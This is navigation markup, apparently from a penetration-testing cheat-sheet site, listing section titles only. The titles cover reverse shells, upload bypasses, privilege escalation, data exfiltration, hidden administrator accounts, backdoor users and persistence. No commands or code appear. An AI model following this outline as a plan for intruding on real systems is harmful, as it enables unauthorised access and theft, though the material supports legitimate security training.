    <span class="md-ellipsis">
      Exploiting Vulnerable Windows Services: Weak Service Permissions
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#find-filefolder-permissions-explicitly-set-for-a-given-user" class="md-nav__link">
    <span class="md-ellipsis">
      Find File/Folder Permissions Explicitly Set for a Given User
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#alwaysinstallelevated-msi" class="md-nav__link">
    <span class="md-ellipsis">
      AlwaysInstallElevated MSI
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#stored-credentials-windows" class="md-nav__link">
    <span class="md-ellipsis">
      Stored Credentials: Windows
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#unquoted-service-path" class="md-nav__link">
    <span class="md-ellipsis">
      Unquoted Service Path
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#persistence-via-services" class="md-nav__link">
    <span class="md-ellipsis">
      Persistence via Services
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#port-forwarding-ssh-tunneling" class="md-nav__link">
    <span class="md-ellipsis">
      Port Forwarding / SSH Tunneling
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Port Forwarding / SSH Tunneling">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ssh-local-port-forwarding" class="md-nav__link">
    <span class="md-ellipsis">
      SSH: Local Port Forwarding
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ssh-dynamic-port-forwarding" class="md-nav__link">
    <span class="md-ellipsis">
      SSH: Dynamic Port Forwarding
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ssh-remote-port-forwarding" class="md-nav__link">
    <span class="md-ellipsis">
      SSH: Remote Port Forwarding
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#proxy-tunnel" class="md-nav__link">
    <span class="md-ellipsis">
      Proxy Tunnel
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#http-tunnel-ssh-over-http" class="md-nav__link">
    <span class="md-ellipsis">
      HTTP Tunnel: SSH Over HTTP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#netsh-windows-port-forwarding" class="md-nav__link">
    <span class="md-ellipsis">
      Netsh - Windows Port Forwarding
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#runas-start-process-as" class="md-nav__link">
    <span class="md-ellipsis">
      RunAs / Start Process As
    </span>
  </a>
  
    <nav class="md-nav" aria-label="RunAs / Start Process As">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#powershell" class="md-nav__link">
    <span class="md-ellipsis">
      PowerShell
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cmd" class="md-nav__link">
    <span class="md-ellipsis">
      CMD
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#psexec" class="md-nav__link">
    <span class="md-ellipsis">
      PsExec
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pth-winexe" class="md-nav__link">
    <span class="md-ellipsis">
      Pth-WinExe
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#recursively-find-hidden-files-windows" class="md-nav__link">
    <span class="md-ellipsis">
      Recursively Find Hidden Files: Windows
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#general-file-search" class="md-nav__link">
    <span class="md-ellipsis">
      General File Search
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#post-exploitation-maintaining-access" class="md-nav__link">
    <span class="md-ellipsis">
      Post-Exploitation &amp; Maintaining Access
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Post-Exploitation & Maintaining Access">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#browsing-registry-hives" class="md-nav__link">
    <span class="md-ellipsis">
      Browsing Registry Hives
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#decrypting-rdg-passwords" class="md-nav__link">
    <span class="md-ellipsis">
      Decrypting RDG Passwords
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#decrypting-vnc-password" class="md-nav__link">
    <span class="md-ellipsis">
      Decrypting VNC Password
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#creating-user-and-adding-to-local-administrators" class="md-nav__link">
    <span class="md-ellipsis">
      Creating User and Adding to Local Administrators
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hide-newly-created-local-administrator" class="md-nav__link">
    <span class="md-ellipsis">
      Hide Newly Created Local administrator
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#creating-ssh-authorized-keys" class="md-nav__link">
    <span class="md-ellipsis">
      Creating SSH Authorized Keys
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#creating-backdoor-user-wo-password" class="md-nav__link">
    <span class="md-ellipsis">
      Creating Backdoor User w/o Password
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#creating-another-root-user" class="md-nav__link">
    <span class="md-ellipsis">
      Creating Another root User
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#generating-openssl-password" class="md-nav__link">
    <span class="md-ellipsis">
      Generating OpenSSL Password
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#persistent-back-doors" class="md-nav__link">
    <span class="md-ellipsis">
      Persistent Back Doors
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#code-execution-application-whitelist-bypass" class="md-nav__link">
    <span class="md-ellipsis">
      Code Execution / Application Whitelist Bypass
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Code Execution / Application Whitelist Bypass">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ieframedll" class="md-nav__link">
    <span class="md-ellipsis">
      Ieframe.dll
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Evasion/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Evasion
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="linux/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Linux AD
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="relaying/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Relaying
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="cobalt/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cobalt Strike
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Certifications
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            Certifications
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certifications/oscp/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    OSCP
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certifications/osep/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    OSEP
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certifications/crte/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CRTE
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certifications/prolabs/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB ProLabs
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#reconnaissance-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Reconnaissance / Enumeration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Reconnaissance / Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#extracting-live-ips-from-nmap-scan" class="md-nav__link">
    <span class="md-ellipsis">
      Extracting Live IPs from Nmap Scan
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#simple-port-knocking" class="md-nav__link">
    <span class="md-ellipsis">
      Simple Port Knocking
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dns-lookups-zone-transfers-brute-force" class="md-nav__link">
    <span class="md-ellipsis">
      DNS lookups, Zone Transfers &amp; Brute-Force
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#banner-grabbing" class="md-nav__link">
    <span class="md-ellipsis">
      Banner Grabbing
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nfs-exported-shares" class="md-nav__link">
    <span class="md-ellipsis">
      NFS Exported Shares
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#kerberos-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Kerberos Enumeration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#http-brute-force-vulnerability-scanning" class="md-nav__link">
    <span class="md-ellipsis">
      HTTP Brute-Force &amp; Vulnerability Scanning
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rpc-netbios-smb" class="md-nav__link">
    <span class="md-ellipsis">
      RPC / NetBios / SMB
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#snmp" class="md-nav__link">
    <span class="md-ellipsis">
      SNMP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smtp" class="md-nav__link">
    <span class="md-ellipsis">
      SMTP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#active-directory" class="md-nav__link">
    <span class="md-ellipsis">
      Active Directory
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listen-on-a-port-powershell" class="md-nav__link">
    <span class="md-ellipsis">
      Listen on a port (Powershell)
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#gaining-access" class="md-nav__link">
    <span class="md-ellipsis">
      Gaining Access
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Gaining Access">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#reverse-shell-one-liners" class="md-nav__link">
    <span class="md-ellipsis">
      Reverse Shell One-Liners
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Reverse Shell One-Liners">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#bash" class="md-nav__link">
    <span class="md-ellipsis">
      Bash
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#perl" class="md-nav__link">
    <span class="md-ellipsis">
      Perl
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#url-encoded-perl-linux" class="md-nav__link">
    <span class="md-ellipsis">
      URL-Encoded Perl: Linux
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#python" class="md-nav__link">
    <span class="md-ellipsis">
      Python
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#php" class="md-nav__link">
    <span class="md-ellipsis">
      PHP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ruby" class="md-nav__link">
    <span class="md-ellipsis">
      Ruby
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#netcat-without-e-1" class="md-nav__link">
    <span class="md-ellipsis">
      Netcat without -e #1
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#netcat-without-e-2" class="md-nav__link">
    <span class="md-ellipsis">
      Netcat without -e #2
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#java" class="md-nav__link">
    <span class="md-ellipsis">
      Java
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xterm" class="md-nav__link">
    <span class="md-ellipsis">
      XTerm
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#jdwp-rce" class="md-nav__link">
    <span class="md-ellipsis">
      JDWP RCE
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#working-with-restricted-shells" class="md-nav__link">
    <span class="md-ellipsis">
      Working with Restricted Shells
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#interactive-tty-shells" class="md-nav__link">
    <span class="md-ellipsis">
      Interactive TTY Shells
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#uploadingposting-files-through-www-upload-forms" class="md-nav__link">
    <span class="md-ellipsis">
      Uploading/POSTing Files Through WWW Upload Forms
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#puting-file-on-the-webhost-via-put-verb" class="md-nav__link">
    <span class="md-ellipsis">
      PUTing File on the Webhost via PUT verb
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#generating-payload-pattern-calculating-offset" class="md-nav__link">
    <span class="md-ellipsis">
      Generating Payload Pattern &amp; Calculating Offset
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bypassing-file-upload-restrictions" class="md-nav__link">
    <span class="md-ellipsis">
      Bypassing File Upload Restrictions
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#injecting-php-into-jpeg" class="md-nav__link">
    <span class="md-ellipsis">
      Injecting PHP into JPEG
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#uploading-htaccess-to-interpret-blah-as-php" class="md-nav__link">
    <span class="md-ellipsis">
      Uploading .htaccess to interpret .blah as .php
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cracking-passwords" class="md-nav__link">
    <span class="md-ellipsis">
      Cracking Passwords
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Cracking Passwords">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#cracking-web-forms-with-hydra" class="md-nav__link">
    <span class="md-ellipsis">
      Cracking Web Forms with Hydra
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cracking-common-protocols-with-hydra" class="md-nav__link">
    <span class="md-ellipsis">
      Cracking Common Protocols with Hydra
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hashcat-cracking" class="md-nav__link">
    <span class="md-ellipsis">
      HashCat Cracking
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#generating-payload-with-msfvenom" class="md-nav__link">
    <span class="md-ellipsis">
      Generating Payload with msfvenom
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#compiling-code-from-linux" class="md-nav__link">
    <span class="md-ellipsis">
      Compiling Code From Linux
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#compiling-assembly-from-windows" class="md-nav__link">
    <span class="md-ellipsis">
      Compiling Assembly from Windows
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#local-file-inclusion-to-shell" class="md-nav__link">
    <span class="md-ellipsis">
      Local File Inclusion to Shell
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#local-file-inclusion-reading-files" class="md-nav__link">
    <span class="md-ellipsis">
      Local File Inclusion: Reading Files
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#remote-file-inclusion-shell-windows-php" class="md-nav__link">
    <span class="md-ellipsis">
      Remote File Inclusion Shell: Windows + PHP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sql-injection-to-shell-or-backdoor" class="md-nav__link">
    <span class="md-ellipsis">
      SQL Injection to Shell or Backdoor
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sqlite-injection-to-shell-or-backdoor" class="md-nav__link">
    <span class="md-ellipsis">
      SQLite Injection to Shell or Backdoor
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ms-sql-console" class="md-nav__link">
    <span class="md-ellipsis">
      MS-SQL Console
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#upgradig-non-interactive-shell" class="md-nav__link">
    <span class="md-ellipsis">
      Upgradig Non-Interactive Shell
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#python-input-code-injection" class="md-nav__link">
    <span class="md-ellipsis">
      Python Input Code Injection
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#local-enumeration-privilege-escalation" class="md-nav__link">
    <span class="md-ellipsis">
      Local Enumeration &amp; Privilege Escalation
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Local Enumeration & Privilege Escalation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#check-applocker-policies" class="md-nav__link">
    <span class="md-ellipsis">
      Check AppLocker Policies
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#applocker-writable-windows-directories" class="md-nav__link">
    <span class="md-ellipsis">
      Applocker: Writable Windows Directories
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#find-writable-filesfolders-in-windows" class="md-nav__link">
    <span class="md-ellipsis">
      Find Writable Files/Folders in Windows
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-if-powershell-logging-is-enabled" class="md-nav__link">
    <span class="md-ellipsis">
      Check if Powershell Logging is Enabled
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-winevent-logs-for-securestring-exposure" class="md-nav__link">
    <span class="md-ellipsis">
      Check WinEvent Logs for SecureString Exposure
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-winevent-for-machine-wakesleep-times" class="md-nav__link">
    <span class="md-ellipsis">
      Check WinEvent for Machine Wake/Sleep times
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#audit-policies" class="md-nav__link">
    <span class="md-ellipsis">
      Audit Policies
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-if-lsass-is-running-in-ppl" class="md-nav__link">
    <span class="md-ellipsis">
      Check if LSASS is running in PPL
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#binary-exploitation-with-immunitydebugger" class="md-nav__link">
    <span class="md-ellipsis">
      Binary Exploitation with ImmunityDebugger
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Binary Exploitation with ImmunityDebugger">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#get-loaded-modules" class="md-nav__link">
    <span class="md-ellipsis">
      Get Loaded Modules
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#finding-jmp-esp-address" class="md-nav__link">
    <span class="md-ellipsis">
      Finding JMP ESP Address
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cracking-a-zip-password" class="md-nav__link">
    <span class="md-ellipsis">
      Cracking a ZIP Password
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#setting-up-simple-http-server" class="md-nav__link">
    <span class="md-ellipsis">
      Setting up Simple HTTP server
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mysql-user-defined-fuction-privilge-escalation" class="md-nav__link">
    <span class="md-ellipsis">
      MySQL User Defined Fuction Privilge Escalation
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#docker-privilege-esclation" class="md-nav__link">
    <span class="md-ellipsis">
      Docker Privilege Esclation
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#resetting-root-password" class="md-nav__link">
    <span class="md-ellipsis">
      Resetting root Password
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#uploading-files-to-target-machine" class="md-nav__link">
    <span class="md-ellipsis">
      Uploading Files to Target Machine
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Uploading Files to Target Machine">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#tftp" class="md-nav__link">
    <span class="md-ellipsis">
      TFTP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ftp" class="md-nav__link">
    <span class="md-ellipsis">
      FTP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#certutil" class="md-nav__link">
    <span class="md-ellipsis">
      CertUtil
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#php_1" class="md-nav__link">
    <span class="md-ellipsis">
      PHP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#python_1" class="md-nav__link">
    <span class="md-ellipsis">
      Python
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#http-powershell" class="md-nav__link">
    <span class="md-ellipsis">
      HTTP: Powershell
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#http-vbscript" class="md-nav__link">
    <span class="md-ellipsis">
      HTTP: VBScript
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#http-linux" class="md-nav__link">
    <span class="md-ellipsis">
      HTTP: Linux
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#netcat" class="md-nav__link">
    <span class="md-ellipsis">
      NetCat
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#http-windows-debugexe-method" class="md-nav__link">
    <span class="md-ellipsis">
      HTTP: Windows "debug.exe" Method
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#http-windows-bitsadmin" class="md-nav__link">
    <span class="md-ellipsis">
      HTTP: Windows BitsAdmin
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#wscript-script-code-download-execution" class="md-nav__link">
    <span class="md-ellipsis">
      Wscript Script Code Download &amp; Execution
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#whois-data-exfiltration" class="md-nav__link">
    <span class="md-ellipsis">
      Whois Data Exfiltration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cancel-data-exfiltration" class="md-nav__link">
    <span class="md-ellipsis">
      Cancel Data Exfiltration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rlogin-data-exfiltration" class="md-nav__link">
    <span class="md-ellipsis">
      rlogin Data Exfiltration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bash-ping-sweeper" class="md-nav__link">
    <span class="md-ellipsis">
      Bash Ping Sweeper
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#brute-forcing-xored-string-with-1-byte-key-in-python" class="md-nav__link">
    <span class="md-ellipsis">
      Brute-forcing XOR'ed string with 1 byte key in Python
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#generating-bad-character-strings" class="md-nav__link">
    <span class="md-ellipsis">
      Generating Bad Character Strings
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#converting-python-to-windows-executable-py-exe" class="md-nav__link">
    <span class="md-ellipsis">
      Converting Python to Windows Executable (.py -&gt; .exe)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#port-scanning-with-netcat" class="md-nav__link">
    <span class="md-ellipsis">
      Port Scanning with NetCat
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#port-scanning-with-masscan" class="md-nav__link">
    <span class="md-ellipsis">
      Port Scanning with Masscan
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploiting-vulnerable-windows-services-weak-service-permissions" class="md-nav__link">
    <span class="md-ellipsis">
      Exploiting Vulnerable Windows Services: Weak Service Permissions
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#find-filefolder-permissions-explicitly-set-for-a-given-user" class="md-nav__link">
    <span class="md-ellipsis">
      Find File/Folder Permissions Explicitly Set for a Given User
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#alwaysinstallelevated-msi" class="md-nav__link">
    <span class="md-ellipsis">
      AlwaysInstallElevated MSI
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#stored-credentials-windows" class="md-nav__link">
    <span class="md-ellipsis">
      Stored Credentials: Windows
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#unquoted-service-path" class="md-nav__link">
    <span class="md-ellipsis">
      Unquoted Service Path
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#persistence-via-services" class="md-nav__link">
    <span class="md-ellipsis">
      Persistence via Services
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#port-forwarding-ssh-tunneling" class="md-nav__link">
    <span class="md-ellipsis">
      Port Forwarding / SSH Tunneling
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Port Forwarding / SSH Tunneling">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ssh-local-port-forwarding" class="md-nav__link">
    <span class="md-ellipsis">
      SSH: Local Port Forwarding
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ssh-dynamic-port-forwarding" class="md-nav__link">
    <span class="md-ellipsis">
      SSH: Dynamic Port Forwarding
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ssh-remote-port-forwarding" class="md-nav__link">
    <span class="md-ellipsis">
      SSH: Remote Port Forwarding
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#proxy-tunnel" class="md-nav__link">
    <span class="md-ellipsis">
      Proxy Tunnel
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#http-tunnel-ssh-over-http" class="md-nav__link">
    <span class="md-ellipsis">
      HTTP Tunnel: SSH Over HTTP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#netsh-windows-port-forwarding" class="md-nav__link">
    <span class="md-ellipsis">
      Netsh - Windows Port Forwarding
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#runas-start-process-as" class="md-nav__link">
    <span class="md-ellipsis">
      RunAs / Start Process As
    </span>
  </a>
  
    <nav class="md-nav" aria-label="RunAs / Start Process As">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#powershell" class="md-nav__link">
    <span class="md-ellipsis">
      PowerShell
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cmd" class="md-nav__link">
    <span class="md-ellipsis">
      CMD
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#psexec" class="md-nav__link">
    <span class="md-ellipsis">
      PsExec
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pth-winexe" class="md-nav__link">
    <span class="md-ellipsis">
      Pth-WinExe
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#recursively-find-hidden-files-windows" class="md-nav__link">
    <span class="md-ellipsis">
      Recursively Find Hidden Files: Windows
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#general-file-search" class="md-nav__link">
    <span class="md-ellipsis">
      General File Search
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#post-exploitation-maintaining-access" class="md-nav__link">
    <span class="md-ellipsis">
      Post-Exploitation &amp; Maintaining Access
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Post-Exploitation & Maintaining Access">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#browsing-registry-hives" class="md-nav__link">
    <span class="md-ellipsis">
      Browsing Registry Hives
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#decrypting-rdg-passwords" class="md-nav__link">
    <span class="md-ellipsis">
      Decrypting RDG Passwords
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#decrypting-vnc-password" class="md-nav__link">
    <span class="md-ellipsis">
      Decrypting VNC Password
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#creating-user-and-adding-to-local-administrators" class="md-nav__link">
    <span class="md-ellipsis">
      Creating User and Adding to Local Administrators
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hide-newly-created-local-administrator" class="md-nav__link">
    <span class="md-ellipsis">
      Hide Newly Created Local administrator
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#creating-ssh-authorized-keys" class="md-nav__link">
    <span class="md-ellipsis">
      Creating SSH Authorized Keys
    </span>
  </a>
  
</li>
        
